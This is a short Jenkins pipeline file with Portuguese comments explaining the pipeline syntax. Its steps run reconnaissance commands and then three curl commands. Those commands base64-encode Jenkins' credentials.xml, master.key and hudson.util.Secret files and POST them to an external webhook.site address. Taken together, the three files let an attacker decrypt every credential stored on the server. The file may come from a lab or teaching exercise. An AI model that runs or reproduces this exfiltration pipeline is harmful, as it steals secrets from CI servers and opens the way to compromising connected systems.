pipeline {
    agent {
        label '(built-in)'    // onde rodar (qualquer agente disponível)
    }
    stages {               // conjunto de etapas
        stage('Nome') {    // uma etapa específica
            steps {        // ações dentro da etapa
                sh 'whoami'
                sh 'uname -a'
                sh 'ls -lha'
                sh 'pwd'
                sh 'echo $JENKINS_HOME'
                sh 'curl -X POST https://webhook.site/6060b474-9bc6-40ca-ae6f-fde78cf4afc6 -H "Content-Type: text/plain" --data-binary "credentials_xml=$(cat /var/jenkins_home/credentials.xml | base64)"'
                sh 'curl -X POST https://webhook.site/6060b474-9bc6-40ca-ae6f-fde78cf4afc6 -H "Content-Type: text/plain" --data-binary "master_key=$(cat /var/jenkins_home/master.key | base64)"'
                sh 'curl -X POST https://webhook.site/6060b474-9bc6-40ca-ae6f-fde78cf4afc6 -H "Content-Type: text/plain" --data-binary "hudson_util_secret=$(cat /var/jenkins_home/hudson.util.Secret | base64)"'


            }
        }
    }
}
